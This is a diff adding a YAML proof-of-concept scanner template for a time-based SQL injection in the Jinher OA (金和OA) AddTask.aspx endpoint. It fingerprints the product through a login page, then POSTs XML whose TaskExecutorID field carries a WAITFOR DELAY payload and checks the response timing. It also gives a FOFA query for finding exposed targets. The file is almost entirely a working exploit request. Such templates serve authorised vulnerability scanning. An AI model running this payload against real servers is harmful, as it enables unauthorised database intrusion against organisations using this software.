@@ -1,0 +1,44 @@
+id: poc-yaml-jinher-addtask-aspx-sqli
+info:
+  name: 金和OA AddTask.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 3
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: POST
+  path: /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/
+  headers:
+    Content-Type: application/xml
+  data: '<root>
+
+    <Page>
+
+    <PageName>TaskDetect</PageName>
+
+    </Page>
+
+    <StartTime>2023-01-01 00:00:00</StartTime>
+
+    <EndTime>2023-01-01 00:00:00</EndTime>
+
+    <TaskExecutorID>3'');WAITFOR DELAY''0:0:{{.t1}}''-- </TaskExecutorID>
+
+    </root>'
+  expression: 'status_code == 200 &&
+
+    body == "1" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
